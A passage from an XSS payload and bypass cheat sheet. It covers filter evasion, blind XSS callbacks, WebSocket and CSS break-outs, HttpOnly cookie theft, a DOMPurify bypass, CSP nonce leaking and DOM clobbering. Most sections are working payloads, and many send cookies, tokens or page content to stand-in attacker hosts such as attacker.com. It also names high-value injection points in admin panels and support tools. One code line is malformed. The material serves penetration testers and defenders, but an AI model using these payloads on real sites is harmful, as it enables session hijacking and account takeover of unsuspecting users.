//  r=\162 i=\151 p=\160 t=\164 :=\072
<a href="\152\141\166\141\163\143\162\151\160\164\072alert(1)">click</a>

// In JS eval context
eval('\152\141\166\141\163\143\162\151\160\164\072alert(1)')

// Mixed octal + hex + entity
<a href="java\x73cript:alert(1)">   // \x73 = 's'
<a href="java&#x73;cript:alert(1)">  // HTML entity for 's'
```
**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

## Bypass Matrix (Updated 2026-05-24)

### New Entries — Techniques Added 2026-05-24

| Filter / Defense | Bypass Technique | Payload Example |
|-----------------|------------------|-----------------|
| `()` parentheses blocked | Template literal invocation | `alert\`1\`` |
| `()` blocked | Error handler + throw | `<img src=x onerror="onerror=alert;throw 1">` |
| `()` blocked | `Reflect.apply.call` + template | `Reflect.apply.call\`${alert}${undefined}${[1]}\`` |
| `()` + keywords blocked | `Symbol.hasInstance` + instanceof | `Array.prototype[Symbol.hasInstance]=eval;"alert\x281\x29" instanceof[]` |
| `()` + keywords blocked | `DOMMatrix` property chain | `x=new DOMMatrix;matrix=alert;x.a=1;location='javascript'+':'+x` |
| Keyword WAF (`alert`,`confirm`) | `Number.toString(base)` conversion | `eval(8680439..toString(30))(983801..toString(36))` |
| Keyword WAF | `String.fromCharCode` | `alert(String.fromCharCode(49))` |
| Mouse event handler WAF | Touch event handlers | `<body ontouchstart=alert(1)>` |
| All script injection blocked | DOM clobbering (HTML-only) | `<a id=x href="javascript:alert(1)">` → code reads `window.x` |
| `javascript:` string match | Octal encoding | `\152\141\166\141\163\143\162\151\160\164\072alert(1)` |
| Modern browser tooling only | Legacy IE sink | `execScript("alert(1)")` |

### New Sinks Documented 2026-05-24

| Sink | Context | Notes |
|------|---------|-------|
| `window.execScript()` | IE 6+ | String arg executes as JScript |
| `setImmediate()` | IE 10+ | String arg executes as code |
| `crypto.generateCRMFRequest()` | Old Firefox | 5th param is executable |
| `ScriptElement.text` | IE + modern | Direct code write to script element |
| `ScriptElement.innerText` | All except old Firefox | Alternate script text write |
| `document.forms[n].action` | DOM clobbering | Clobbered via `<form name=...>` |
| `window.name` | Cross-page | Attacker sets name; victim: `location=name` |
| `document.onkeypress` | Post-XSS chain | Real-time keystroke exfil |

### CSP Configurations Seen & Weaknesses (2026)

| CSP Configuration | Weakness | Bypass |
|------------------|----------|--------|
| `script-src 'self'` | Whitelists same-origin JSONP | Find JSONP endpoint on target |
| `script-src cdn.example.com` | CDN hosts Angular 1.x / jQuery | Script gadget via `ng-app` or `$.globalEval` |
| `script-src 'nonce-XYZ'` | Nonce reflected in page source | Read nonce, inject `<script nonce=...>` |
| `script-src 'strict-dynamic'` | Trusted scripts can create scripts | Gadget in loaded library |
| No `base-uri` directive | `<base>` tag injection | `<base href="//attacker.com/">` hijacks relative loads |
| No `object-src` directive | Plugin/object execution | `<object data="javascript:alert(1)">` |
| `default-src 'none'` + no `form-action` | Form POST exfil | POST form to attacker (no fetch needed) |
| `require-trusted-types-for 'script'` | Permissive policy or prototype pollution | Pollute `__proto__` to inject into TT policy |


---

## Blind XSS with Out-of-Band Exfil (XSS Hunter Pattern)

**Type:** stored / reflected
**Filter bypassed:** Standard sanitizers that don't execute payloads during validation — blind endpoints never render output to the tester
**Bypass logic:** Blind XSS targets fields rendered in admin panels, support ticketing systems, log viewers, or email templates — contexts the attacker never sees directly. The payload phones home via external script load or fetch. XSS Hunter / Canarytokens / custom callback servers confirm execution and return full context (cookies, DOM snapshot, screenshot, IP).
**Attack chain:** XSS in low-visibility input → fires in admin/agent browser → admin session cookie exfilled → full admin account takeover

**Payload:**
```html
<!-- External script load — works where CSP allows external scripts -->
"><script src="https://ATTACKER.xss.ht"></script>

<!-- No-quotes variant for attribute injection -->
"><script src=//ATTACKER.xss.ht></script>

<!-- jQuery callback (if jQuery is loaded on admin panel) -->
<script>$.getScript("//ATTACKER.xss.ht")</script>

<!-- Fetch + callback with full context (no external lib needed) -->
<img src=x onerror="
  fetch('https://ATTACKER.com/b?'+btoa(JSON.stringify({
    c:document.cookie,
    u:location.href,
    r:document.referrer,
    t:document.title
  })))
">

<!-- Polyglot blind XSS — works across HTML, attribute, and JS contexts -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=fetch('//ATTACKER.xss.ht')//>\x3e
```

**High-value injection points for blind XSS:**
```
- Contact/support form message body
- Ticket title and description fields
- User-Agent header (log viewers)
- Referer header (analytics dashboards)
- Feedback / bug report text
- Username / display name (admin user management)
- Shipping address line 2, company name
- API key description / OAuth app name
- Webhook URL field (rendered in admin without fetching)
- Error message fields that feed into internal alerting
```

**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection ; https://xsshunter.com

---

## XML Namespace Confusion XSS

**Type:** stored / reflected
**Filter bypassed:** XML-aware sanitizers and WAFs that block `<script>` but don't process qualified element names with custom namespace prefixes
**Bypass logic:** XML parsers treat `prefix:localname` as a qualified name. When the namespace URI maps to XHTML (`http://www.w3.org/1999/xhtml`), browsers executing the document in an XML context interpret `<something:script>` as a real `<script>` element. Sanitizers that pattern-match on tag names without resolving namespaces miss this. Effective against XML/XHTML-served responses and SVG documents parsed as XML.
**Attack chain:** XSS via XML namespace confusion → bypasses tag-name blacklist → script execution → cookie theft → ATO

**Payload:**
```xml
<!-- Custom-prefixed script element in XHTML namespace -->
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(document.cookie)</something:script>

<!-- Inside SVG — namespace declared on root, child uses prefix -->
<svg xmlns:x="http://www.w3.org/1999/xhtml">
  <x:script>alert(1)</x:script>
</svg>

<!-- Inside XML island (IE, legacy) -->
<xml id="xdoc">
  <xss:script xmlns:xss="http://www.w3.org/1999/xhtml">alert(1)</xss:script>
</xml>

<!-- Polyglot HTML+XML ambiguity -->
<html xmlns="http://www.w3.org/1999/xhtml">
<foo:script xmlns:foo="http://www.w3.org/1999/xhtml">alert(1)</foo:script>
```

**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

## CSS Context Break-Out via background-image Data URI

**Type:** stored / reflected
**Filter bypassed:** WAF/sanitizers that allow `<style>` blocks or CSS injection points but don't parse data URI content inside CSS property values
**Bypass logic:** A data URI embedded in a CSS `url()` value can contain a closing `</style>` sequence (escaped as `<\/style>` to avoid JS string issues) followed by an SVG `onload` payload. When the browser renders the page, the CSS parser reads the data URI as opaque content, but the HTML parser, processing the raw source, sees `</style>` and exits the style block early — causing the `<svg/onload=...>` that follows to be interpreted as HTML and executed.
**Attack chain:** CSS injection point → style block break-out → inline SVG → JS execution → cookie exfil → ATO

**Payload:**
```html
<!-- Standard break-out via data URI in background-image -->
<style>
div {
  background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
}
</style>

<!-- Without base64 — raw break-out -->
<style>*{background:url('data:text/css,<\/style><img src=x onerror=alert(1)>')}</style>

<!-- In CSS injection context (user controls value inside existing style block) -->
/* injected: */ x}body{background:url("data:,<\/style><svg onload=fetch('//attacker.com/?c='+document.cookie)>")}
```

**Where to test:**
- Custom CSS themes / user-defined style fields
- Color picker values inserted into `<style>` blocks
- Font URL or background image URL parameters in CSS
- Web builders (Wix, Webflow custom CSS)

**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

## SVG CDATA Section Parser Confusion

**Type:** stored / reflected
**Filter bypassed:** XML-mode parsers and sanitizers that treat CDATA sections as inert character data — failing to see the script tag after the CDATA closes early
**Bypass logic:** In XML/SVG documents, `<![CDATA[...]]>` marks a section of raw character data. If a sanitizer treats everything inside CDATA as text, it misses a pattern where the CDATA close sequence (`]]>`) appears inside the CDATA body, ending the section prematurely. The remaining content is then parsed as regular XML markup — including `<script>` tags. Works specifically in SVG documents and XML-served pages where the parser is XML-mode rather than HTML-mode.
**Attack chain:** Stored SVG upload or XML injection → CDATA confusion bypasses sanitizer → `<script>` executed → persistent XSS → all viewers affected

**Payload:**
```xml
<!-- Basic CDATA close confusion in SVG desc element -->
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>

<!-- foreignObject variant -->
<svg><foreignObject><![CDATA[</foreignObject><script>alert(document.cookie)</script>]]></svg>

<!-- title element confusion -->
<svg><title><![CDATA[</title><script>alert(document.domain)</script>]]></svg>

<!-- With actual exfil payload -->
<svg>
  <desc><![CDATA[</desc>
  <script>
    new Image().src='https://attacker.com/x?c='+encodeURIComponent(document.cookie)
  </script>]]>
</svg>
```

**Note:** HTML5 parsers handle CDATA differently and are generally not vulnerable to this pattern. This primarily affects XML/XHTML document modes and SVG files parsed as `image/svg+xml`.

**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

## WebSocket-Based DOM XSS

**Type:** DOM
**Filter bypassed:** Traditional XSS scanners that crawl HTTP request/response cycles and miss real-time WebSocket message processing; server-side sanitizers that validate HTTP input but not WebSocket frames
**Bypass logic:** WebSocket messages received by `onmessage` handlers are often passed directly into DOM sinks (innerHTML, eval, document.write) without sanitization, because developers assume WebSocket traffic is trustworthy (same-origin) or less exposed. Attackers can inject via: (1) a stored XSS that sends a malicious WS message, (2) WebSocket hijacking from a CSRF context, (3) MitM on non-WSS connections, or (4) server-side injection where WS messages relay user-controlled data.
**Attack chain:** WebSocket message injection → unsanitized message hits DOM sink → XSS executes → real-time session/token theft → ATO

**Payload:**
```javascript
// Vulnerable WebSocket handler pattern (server sends user-controlled data):
var ws = new WebSocket('wss://target.com/chat');
ws.onmessage = function(event) {
    document.getElementById('chat').innerHTML += event.data;  // Sink: innerHTML
};

// If attacker can send: {"msg": "<img src=x onerror=alert(1)>"}
// → innerHTML sink fires when chat box renders the message

// WebSocket CSRF hijack — read WS messages across origin via cross-origin iframe:
// (Works on ws:// — non-encrypted — or if CORS is misconfigured for WS upgrade)
var ws = new WebSocket('ws://victim.com/ws');
ws.onmessage = function(e) {
    fetch('https://attacker.com/steal?d=' + btoa(e.data));
};

// From existing XSS context — inject malicious WS message to all connected sessions:
var ws = new WebSocket('wss://target.com/chat');
ws.onopen = function() {
    ws.send(JSON.stringify({
        msg: '<script>document.location="https://attacker.com/steal?c="+document.cookie</script>'
    }));
};

// Test for WS XSS: send HTML tags in message body via WS client (Burp WebSocket tab)
// Payload to send as raw WS message:
<img src=x onerror=alert(document.domain)>
{"type":"message","body":"<svg onload=alert(1)>"}
```

**Detection steps:**
```
1. Open DevTools → Network → WS tab → observe message frames
2. Find messages containing user-controlled strings reflected back
3. Replace string with XSS payload in Burp's WebSocket repeater
4. Check if payload reaches innerHTML / eval on receive
5. Also check ws:// (non-TLS) for hijack potential
```

**Source:** https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking ; https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

## Bypass Matrix (Updated 2026-05-25)

### New Entries — Techniques Added 2026-05-25

| Filter / Defense | Bypass Technique | Payload Example |
|-----------------|------------------|-----------------|
| No output to tester (blind endpoint) | Out-of-band callback (XSS Hunter) | `"><script src=//ATTACKER.xss.ht></script>` |
| XML tag-name blacklist (`<script>`) | XML namespace prefix confusion | `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>` |
| `<style>` allowed, JS blocked | CSS `background-image` data URI break-out | `url("data:,<\/style><svg onload=alert(1)>")` |
| XML sanitizer (CDATA treated as safe) | CDATA section premature close | `<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>` |
| HTTP-only XSS scanner (misses WS) | WebSocket message injection | Send `<img src=x onerror=alert(1)>` as WS frame to `innerHTML` sink |
| WAF on HTTP params (misses WS frames) | WS hijack for cross-origin exfil | Open WS from attacker page; relay `event.data` to attacker server |

### New Sinks Documented 2026-05-25

| Sink | Context | Notes |
|------|---------|-------|
| `WebSocket.onmessage → innerHTML` | DOM / real-time chat | WS frames bypass HTTP WAF; often unsanitized |
| `WebSocket.onmessage → eval` | DOM / live config push | Real-time config updates passed through eval |
| CSS `url()` value | CSS injection | Data URI with `<\/style>` breaks out of `<style>` block |
| XML namespaced script element | XML/SVG/XHTML | `xmlns` prefix maps to XHTML — script executes |

### High-Value Blind XSS Injection Points (2026-05-25)

| Injection Point | Why Valuable | Likely Victim |
|----------------|-------------|---------------|
| Support ticket body | Rendered in agent/admin ticket view | Support agent session |
| User-Agent header | Logged and displayed in analytics | DevOps / admin dashboard |
| Referer header | Shown in traffic reports | Analytics admin |
| API key / OAuth app name | Admin billing/key management view | Platform admin |
| Feedback / bug report form | Viewed by engineering or support | Internal employee |
| Webhook description | Admin webhook management panel | Admin session |

---

## Dangling Markup Injection

**Type:** reflected
**Filter bypassed:** Strict CSP (no `unsafe-inline`, no `script-src`); XSS filters that block script execution but allow partial HTML injection
**Bypass logic:** When XSS is blocked but HTML injection is possible, an unclosed `<img src="` or `<form action="` causes the browser to capture everything following the injection point — including CSRF tokens, nonces, email addresses, and other sensitive page content — and exfiltrate it as part of an HTTP request URL to the attacker's server. No JavaScript required.
**Attack chain:** HTML injection → unclosed attribute slurps subsequent page content → CSRF token/nonce captured via HTTP request to attacker → CSRF attack executed → account actions performed without victim's knowledge

**Payload:**
```html
<!-- Unclosed src attribute — browser sends subsequent page text as URL path -->
<img src='https://attacker.com/?leak=

<!-- Form redirect — captures all form inputs on the page -->
<form action='https://attacker.com/steal'>

<!-- Meta refresh — page redirects with captured content in URL -->
<meta http-equiv=refresh content='0;url=https://attacker.com/?c=

<!-- Named anchor — captures text up to the next matching quote char in source -->
<a href='https://attacker.com/?x=
```

**Where to use:** Any endpoint where HTML injection is possible but CSP blocks script execution — login pages with error message reflection, account settings with display name reflection, partial HTML injection in API responses.

**Source:** https://portswigger.net/web-security/cross-site-scripting/dangling-markup

---

## Cookie Sandwich Technique — HttpOnly Bypass

**Type:** stored / reflected (post-XSS exploitation)
**Filter bypassed:** `HttpOnly` cookie flag — normally prevents `document.cookie` from reading session cookies
**Bypass logic:** Many servers support RFC2109 (legacy) cookie parsing alongside RFC6265. When the `$Version` cookie appears first in the `Cookie` header, servers switch to legacy mode where quoted strings are valid cookie values. By setting two attacker-controlled cookies that "sandwich" the HttpOnly target cookie — one whose value ends with `"` and one whose value starts with `"` — the legacy parser reads all cookies between the quotes as a single value and reflects the full string (including the HttpOnly cookie) in a response body accessible via `fetch()` with credentials.
**Attack chain:** XSS fires → attacker sets `$Version` + sandwich cookies → `fetch()` endpoint that echoes `Cookie` header or parses cookie values → response body contains HttpOnly cookie value → exfil to attacker server → full session hijack

**Payload:**
```javascript
// From XSS context on target.com:

// Step 1: Set $Version cookie with longer path so it sorts first in Cookie header
document.cookie = '$Version=1; path=/json/';

// Step 2: Set opening sandwich cookie (value ends with " to open RFC2109 quote)
document.cookie = 'wrap_start="; path=/';

// Step 3: Set closing sandwich cookie (value is just a closing quote)
document.cookie = 'wrap_end="; path=/';

// Cookie header now looks like:
// Cookie: $Version=1; wrap_start="; PHPSESSID=SECRET_VALUE; wrap_end="
// Legacy parser reads wrap_start's value as: " PHPSESSID=SECRET_VALUE "
// → PHPSESSID is now part of wrap_start's quoted value and reflected in response

// Step 4: Fetch endpoint that echoes cookies
fetch('/api/session/info', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
    fetch('https://attacker.com/steal?d=' + btoa(JSON.stringify(data)));
  });

// Affected stacks: Apache Tomcat 8.5.x / 9.0.x / 10.0.x (RFC2109 on by default)
//                  Python Flask (legacy parsing supported)
// Prerequisite: XSS on target domain + endpoint that reflects Cookie header in response
```

**Source:** https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique

---

## DOMPurify Prototype Pollution Depth Bypass (CVE-2024-45801)

**Type:** stored / reflected / DOM
**Filter bypassed:** DOMPurify sanitizer (versions before 2.5.4 and before 3.1.3)
**Bypass logic:** Two exploitation paths: (1) Pollute `Object.prototype` with a key matching DOMPurify's internal depth counter property name. The `depth > threshold` comparison reads an attacker-controlled `NaN` value — `NaN > 200` is always `false` — so the nesting depth limit is never triggered, allowing arbitrarily deep nested XSS payloads through sanitization. (2) Deeply nested HTML structures alone can confuse the depth counter in some sub-versions. Both paths allow XSS payloads to survive `DOMPurify.sanitize()` and execute when the output is inserted via `innerHTML`.
**Attack chain:** Prior prototype pollution vector (e.g., `?__proto__[depthKey]=NaN` via lodash/merge) → DOMPurify depth check disabled → XSS payload passes sanitization → inserted via `innerHTML` → arbitrary JS executes → ATO

**Payload:**
```javascript
// Step 1: Pollute the depth counter via any existing PP gadget on the page
// (key name varies; check DOMPurify source for the version in use)
Object.prototype['__recursionLimit'] = NaN;

// Step 2: Pass a deeply nested XSS payload to DOMPurify
// (depth check now always returns false due to NaN comparison)
var malicious = '<svg>'.repeat(300) + '<img src=x onerror=alert(1)>' + '</svg>'.repeat(300);
var "clean" = DOMPurify.sanitize(malicious);   // passes — depth check bypassed
document.body.innerHTML = clean;              // XSS fires

// Alternatively — URL-based PP vector (no prior gadget needed if app parses URL params):
// https://target.com/?__proto__[depthCounter]=NaN&q=<NESTED_XSS>

// Detect DOMPurify version: DOMPurify.version (from browser console or page source)
// Patched in: DOMPurify >=2.5.4 or >=3.1.3
// Also check CVE-2026-41238: CUSTOM_ELEMENT_HANDLING fallback polluted by PP
//   → tagNameCheck / attributeNameCheck regex replaced → arbitrary tags allowed
```

**Source:** https://github.com/advisories/GHSA-mmhx-hmjr-r674 ; https://www.sentinelone.com/vulnerability-database/cve-2024-45801/

---

## CSS Attribute Selector Nonce Leak + bfcache CSP Bypass

**Type:** reflected (HTML/CSS injection only — no script execution required to leak)
**Filter bypassed:** Strict nonce-based CSP (`script-src 'nonce-XYZ'`) — widely considered near-unbypassable without the nonce
**Bypass logic:** CSS attribute selectors (`script[nonce^="a"]`) can fire `background-image` network requests conditionally based on whether an attribute value begins with a specific character. By injecting CSS that iterates over each possible nonce character, an attacker leaks the full nonce one character at a time via server-side request logging. Once the nonce is known, the browser's bfcache or disk cache may still hold the original page with the matching nonce — navigating back serves the stale page with the known nonce, into which the attacker injects `<script nonce="LEAKED">`.
**Attack chain:** CSS injection → attribute selector oracle leaks nonce char-by-char → full nonce reconstructed → inject `<script nonce=LEAKED-NONCE>` → XSS → ATO

**Payload:**
```html
<!-- Step 1: Inject CSS oracle for each hex character (0-9, a-f) -->
<style>
script[nonce^="0"]{background:url(https://attacker.com/n?c=0)}
script[nonce^="1"]{background:url(https://attacker.com/n?c=1)}
script[nonce^="2"]{background:url(https://attacker.com/n?c=2)}
/* ... repeat for all nonce charset characters ... */
script[nonce^="a"]{background:url(https://attacker.com/n?c=a)}
script[nonce^="b"]{background:url(https://attacker.com/n?c=b)}
/* ... */
</style>
<!-- Attacker server logs which request fires → learns first nonce character -->
<!-- Repeat with nonce^="KNOWN_PREFIX" + each next char to leak full nonce -->

<!-- Step 2: After learning nonce value, inject script with stolen nonce -->
<script nonce="FULL-LEAKED-NONCE-HERE">
fetch('https://attacker.com/steal?c=' + document.cookie);
</script>

<!-- bfcache variant: if the nonce changes per-request, use history navigation -->
<!-- or link prefetching to serve the cached page version where nonce matches -->

<!-- Automation: use Burp Collaborator + style injection to iterate all chars -->
<!-- 32-char hex nonce = 32 rounds × 16 requests = 512 requests total        -->
```

**Source:** https://www.webasha.com/blog/what-is-the-new-technique-that-bypasses-content-security-policy-using-html-injection-and-browser-caching ; https://portswigger.net/research/hunting-nonce-based-csp-bypasses-with-dynamic-analysis

---

## PHP max_input_vars CSP Header Bypass

**Type:** reflected / stored
**Filter bypassed:** CSP policy delivered via PHP `header()` function
**Bypass logic:** PHP's `max_input_vars` directive (default: 1000) limits the number of parsed input variables. When a request exceeds this limit, PHP emits an `E_WARNING` — which is output as HTML before any user-defined code runs. This causes "headers already sent" — the subsequent `header('Content-Security-Policy: ...')` call silently fails. Without the CSP header, inline scripts execute without restriction.
**Attack chain:** Submit 1001+ GET/POST parameters → PHP warning printed before CSP header → CSP header never sent → inline XSS payload executes freely

**Payload:**
```python
# Python PoC — send 1001 parameters to drop CSP header
import requests

params = {f'x{i}': 'a' for i in range(1001)}
params['q'] = '<script>alert(document.cookie)</script>'  # XSS injection param

r = requests.get('https://target.com/search.php', params=params)
print('Content-Security-Policy' in r.headers)  # False → CSP not sent → XSS works
print(r.text)  # Should contain the XSS payload unescaped
```

```html
<!-- Browser form variant: 1001 hidden inputs -->
<form method="POST" action="https://target.com/page.php" id="bypass">
  <input name="inject" value='<img src=x onerror=alert(document.cookie)>'>
  <!-- generate 1000 more inputs: -->
  <script>
    var f = document.getElementById('bypass');
    for(var i=0;i<1000;i++){
      var inp = document.createElement('input');
      inp.name='p'+i; inp.value='x';
      f.appendChild(inp);
    }
    f.submit();
  </script>
</form>
```

**Note:** Also works via multipart file upload — PHP counts each file toward the limit; 20+ files often trigger the warning.

**Source:** https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/4%20-%20CSP%20Bypass.md

---

## Full-Width Unicode Angle Bracket Bypass

**Type:** reflected / stored
**Filter bypassed:** WAF / input sanitizers blocking ASCII `<` (U+003C) and `>` (U+003E) without Unicode normalization
**Bypass logic:** Unicode fullwidth characters `＜` (U+FF1C) and `＞` (U+FF1E) are visually identical to `<>`. Certain server-side template engines, older XML parsers, or frameworks that normalize Unicode before rendering will convert fullwidth to ASCII — meaning the fullwidth characters pass the WAF's ASCII `<>` filter but land in the HTML as functional tag delimiters. Also useful: Unicode modifier letter variants as quote substitutes.
**Attack chain:** WAF sees fullwidth chars → no block → template engine normalizes U+FF1C→`<` → HTML parser sees valid tag → XSS fires

**Payload:**
```html
＜script＞alert(1)＜/script＞
＜img src=x onerror=alert(document.cookie)＞
＜svg onload=alert(1)＞
＜body onload=alert(1)＞

<!-- Modifier letter double prime (U+02BA) as " substitute -->
＜img src=x onerror=ʺjavascript:alert(1)ʺ＞

<!-- Mix with UTF-8 overlong encoding (some older parsers) -->
<!-- %C0%BC = overlong encoding of < in UTF-8 (invalid but accepted by some parsers) -->
%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE

<!-- Full-width digits bypass number filters in payloads -->
＜img src=x onerror=alert(１)＞   <!-- １ = U+FF11 fullwidth digit one -->
```

**Source:** https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md

---

## Array Method Function Invocation + Regex Source Reconstruction

**Type:** reflected / stored / DOM
**Filter bypassed:** WAF blocking parentheses `()` AND/OR keyword filters blocking function names like `alert`, `fetch`, `eval` — extends no-parens bypass with zero-keyword technique
**Bypass logic:** Two chained techniques: (1) JavaScript Array prototype methods (`map`, `forEach`, `findIndex`) accept a function reference and invoke it with each element — `[7].map(alert)` calls `alert(7)` without parentheses or the string `"alert"`. (2) Regex literals have a `.source` property returning the literal's pattern as a plain string — `(/al/.source + /ert/.source)` produces `"alert"` without the string `alert` ever appearing in source. Combining both: `top[/al/.source+/ert/.source]` accesses `window.alert` from a string built entirely from regex, then array methods invoke it.
**Attack chain:** WAF blocks `()` and `alert` keyword → array method + regex source bypass → function invoked → cookie/token exfil → ATO

**Payload:**
```javascript
// Basic: array method invocation without ()
[7].map(alert)                        // → alert(7)
[1].forEach(alert)                    // → alert(1)
[11].findIndex(alert)                 // → alert(11)
[document.cookie].map(fetch.bind(0,'https://attacker.com/steal?c='))

// Regex source reconstruction — no keyword strings in source at all
top[/al/.source+/ert/.source](8)     // → window['alert'](8)
top[/fe/.source+/tch/.source]('https://attacker.com/steal?c='+document.cookie)

// Combined: no parens, no keywords, exfil payload
[document.cookie].map(top[/fe/.source+/tch/.source].bind(top,'https://attacker.com/?'))

// Access nested properties
window[/doc/.source+/ument/.source][/cook/.source+/ie/.source]
// → document.cookie (as string, for use in eval or concat)

// Chained with throw (no parens anywhere):
onerror=top[/al/.source+/ert/.source];throw document.cookie
<img src=x onerror="onerror=top[/al/.source+/ert/.source];throw 1">
```

**Source:** https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md

---

## Null Byte Injection in Attribute Names

**Type:** reflected / stored
**Filter bypassed:** WAF / regex rules matching exact event handler attribute names (`onerror`, `onload`, `onclick`) — null bytes or control characters break string matching without affecting browser parsing in certain parsers
**Bypass logic:** Some browsers and older parsers strip null bytes (`\x00`), vertical tabs (`\x0b`), and other control characters from attribute names during HTML parsing. A WAF that pattern-matches the raw bytes sees `onerror\x00` (no match), but the parser strips the null byte before attribute lookup — treating it as `onerror`. Additionally, a forward slash between attribute name and `=` acts as whitespace in some parsers, bypassing space-sensitive WAF signatures.
**Attack chain:** WAF sees garbled attribute name → no block → parser normalizes → event handler fires → XSS

**Payload:**
```html
<!-- Null byte after attribute name -->
<img src=x onerror&#x00;=alert(1)>
<img src=x onerror%00=alert(1)>

<!-- Vertical tab (0x0B) as separator -->
<img src=x onerror&#x0B;=alert(1)>

<!-- Form feed (0x0C) as whitespace alternative -->
<img&#x0C;src=x onerror=alert(1)>

<!-- Slash as attribute name/value separator (some parsers) -->
<img src=x onerror/=alert(0)>
<img/src=x/onerror=alert(1)>

<!-- Zero-width space (U+200B) within attribute name -->
<img src=x on&#x200B;error=alert(1)>

<!-- Null in tag name (some legacy parsers) -->
<scr\x00ipt>alert(1)</scr\x00ipt>

<!-- Incomplete tag trick (auto-closed by browser) -->
<img src='1' onerror='alert(0)' <
```

**Source:** https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md

---

## JSFuck — Extreme Character-Set Obfuscation

**Type:** reflected / stored / DOM
**Filter bypassed:** ALL keyword-based WAF rules, all string-pattern detection — uses only 6 characters: `[` `]` `(` `)` `!` `+`
**Bypass logic:** JSFuck is a JavaScript encoding scheme exploiting type coercion to represent any JS program using only `[]!()`. `![]` coerces to `false`, `!![]` to `true`, `+[]` to `0`, `+!![]` to `1`. From these, any digit, then any ASCII character, then any string, then any function call can be constructed — all without a single alphabetic character. The result is syntactically valid JavaScript that executes in any browser but contains zero recognizable keywords, identifiers, or strings.
**Attack chain:** Full XSS payload encoded in JSFuck → bypasses all keyword/pattern WAF rules → executed by browser JS engine → cookie theft/ATO

**Payload:**
```javascript
// alert(1) encoded (abbreviated — full output ~6KB, use https://jsfuck.com):
// [][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]
// [...](...) — generates 'alert' then calls it with 1

// Type coercion building blocks:
![]           // false
!![]          // true
+[]           // 0
+!![]         // 1
[]+[]         // ""
![]+[]        // "false"
!![]+[]       // "true"
+[![]]        // NaN

// Build 'alert' character by character:
// 'a' = (![]+[])[+[]]           → 'false'[0] = 'f' ... (iterate indices)
// Full construction: use https://jsfuck.com or jjencode for production payloads

// Practical shortcut: use eval via JSFuck + atob for shorter total length
// Encode eval('fetch("//attacker.com?c="+document.cookie)') in JSFuck
// Often more WAF-resistant than base64+eval due to zero printable keywords

// Where to use:
// - WAF testing after confirming XSS exists but payload is blocked
// - Length-constrained contexts where atob/eval are also filtered
// - Bypass log-based detections that scan for JS keywords
```

**Source:** https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md ; https://jsfuck.com

---

## DOM Clobbering → CSP Bypass via script.src Injection

**Type:** DOM / stored (HTML injection only — no script execution required)
**Filter bypassed:** `strict-dynamic` CSP — which normally prevents unsigned/unnonce'd scripts from loading; bypassed here via HTML-only injection clobbering a config property read into a `<script src>` attribute
**Bypass logic:** When an app uses `strict-dynamic` and a trusted (nonce-bearing) script reads a config object property into a dynamically created `<script src>`, DOM clobbering can replace that property with an attacker-controlled URL. Double anchor tags with matching `id` attributes create an `HTMLCollection`; the `name` attribute on the second gives it a property name. When the trusted script reads `window.config.scriptPath`, it receives the attacker's URL. Scripts created by trusted scripts inherit `strict-dynamic` trust — no nonce needed for the attacker's script.
**Attack chain:** HTML injection → double `<a id=config>` clobbers `window.config` → trusted script reads clobbered `config.path` → creates `<script src="attacker.com/evil.js">` → strict-dynamic passes it → attacker JS executes → XSS → ATO

**Payload:**
```html
<!-- Target code pattern to exploit: -->
<!-- var s = document.createElement('script');                    -->
<!-- s.src = window.appConfig.codeBasePath + '/bundle.js';       -->
<!-- document.head.appendChild(s);  // trusted, has nonce        -->

<!-- DOM clobbering injection — HTML-only, no script needed: -->
<a id=appConfig><a id=appConfig name=codeBasePath href="https://attacker.com/evil.js#">

<!-- How it works:                                                        -->
<!-- window.appConfig → HTMLCollection (two <a> with same id)            -->
<!-- window.appConfig.codeBasePath → second <a> element (name= match)   -->
<!-- .href → "https://attacker.com/evil.js#"                             -->
<!-- Script loads: https://attacker.com/evil.js#/bundle.js               -->
<!--   (# turns the suffix into a URL fragment — ignored by attacker)    -->

<!-- Variant: clobber nested property two levels deep -->
<form id=config><input id=scriptPath name=src value="https://attacker.com/x.js"></form>
<!-- window.config.scriptPath.src → attacker URL -->

<!-- DOM clobbering via form action -->
<form name=loginForm><input name=action value="https://attacker.com/phish"></form>
<!-- document.forms.loginForm.action → attacker URL (clobbers form action) -->
```

**Source:** https://portswigger.net/research/bypassing-csp-via-dom-clobbering ; https://aseemshrey.in/blog/xss-bypass-csp/

---

## Angular CSTI Version-Specific Sandbox Escapes

**Type:** reflected / stored (client-side template injection)
**Filter bypassed:** AngularJS expression sandbox (versions 1.0–1.5.x); WAF keyword filters blocking `constructor` string
